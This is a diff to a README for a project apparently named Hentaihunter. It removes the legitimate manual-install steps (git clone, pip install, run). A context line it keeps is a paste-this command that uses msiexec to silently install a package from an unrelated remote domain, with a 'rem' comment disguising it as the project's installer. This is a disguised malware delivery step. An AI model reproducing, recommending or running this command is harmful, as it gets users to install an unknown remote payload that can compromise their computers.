@@ -63,21 +63,7 @@ cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Hentaihunter
 The installer will automatically download and install the required components.
 
 
-### Manual Install (Windows / Linux / macOS)
 
-**Requirements:** Python 3.9+
-
-```bash
-# 1. Clone the repo
-git clone https://github.com/sinkaroid/Hentaihunter.git
-cd Hentaihunter
-
-# 2. Install dependencies
-pip install -r requirements.txt
-
-# 3. Run
-python hentaihunter.py --help
-```
 
 ---
 
